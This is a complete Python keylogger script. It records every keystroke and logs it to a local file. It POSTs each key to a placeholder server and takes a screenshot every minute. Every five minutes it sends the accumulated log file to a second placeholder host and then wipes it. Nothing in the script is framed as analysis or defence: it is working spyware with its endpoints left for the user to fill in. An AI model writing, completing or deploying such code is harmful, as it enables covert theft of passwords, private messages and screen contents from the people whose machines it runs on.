import os
import pynput
from pynput.keyboard import Key, Listener
import logging
from PIL import ImageGrab
import requests
import time
import threading

# Setup logging
log_file = "keylogs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
        # Send HTTP POST request with key data
        requests.post("http://your_server_address/upload", data={"key": str(key.char)})
    except AttributeError:
        logging.info(f'Special key pressed: {key}')
        requests.post("http://your_server_address/upload", data={"key": str(key)})
        
def screenshot():
    while True:
        img = ImageGrab.grab()
        img.save(f"screenshot_{int(time.time())}.png")
        time.sleep(60)  # Take a screenshot every 60 seconds

def send_logs():
    while True:
        time.sleep(300)  # Every 5 minutes
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                logs = f.read()
            # Example endpoint - replace with your own
            requests.post("http://yourserver.com/upload", data={"logs": logs})
            # Clear the log file after sending
            open(log_file, 'w').close()

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Start threads for screenshot and sending logs
screenshot_thread = threading.Thread(target=screenshot, daemon=True)
screenshot_thread.start()

send_logs_thread = threading.Thread(target=send_logs, daemon=True)
send_logs_thread.start()

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
